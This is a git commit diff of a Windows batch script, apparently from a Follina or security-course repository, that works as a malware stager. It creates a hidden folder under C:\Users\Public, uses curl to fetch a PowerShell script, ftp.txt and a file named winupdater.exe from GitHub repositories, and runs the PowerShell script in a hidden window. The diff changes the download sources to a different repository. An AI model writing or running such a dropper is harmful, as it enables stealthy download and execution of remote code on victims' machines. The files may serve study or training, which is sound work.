8af0d4f3e90b2f724b4abb17a63875f7a21a6941
Stefano Poncini <poncini208@gmail.com>
2023-07-26 13:17:22 +0200

    Add files via upload

--- commands.bat
+++ commands.bat
@@ -3,8 +3,10 @@ mkdir "C:\Users\Public\Public Presentations"
 attrib +h "C:\Users\Public\Public Presentations"							
 cd "C:\Users\Public\Public Presentations"
 
-curl -LJO https://github.com/Prevail9/Follina/raw/main/ftp.txt -o "C:\Users\Public\Public Presentations"
-curl -LJO https://github.com/Prevail9/Follina/raw/main/winupdater.exe -o "C:\Users\Public\Public Presentations"
+
+curl -LJO https://raw.githubusercontent.com/ponciste/ironhack/main/desmon.ps1 -o "C:\Users\Public\Public Presentations"
+curl -LJO https://raw.githubusercontent.com/ponciste/ironhack/main/ftp.txt -o "C:\Users\Public\Public Presentations"
+curl -LJO https://github.com/ponciste/ironhack/raw/main/winupdater.exe -o "C:\Users\Public\Public Presentations"
 
 powershell.exe -WindowStyle hidden "C:\Users\Public\Public Presentations\desmon.ps1"
 
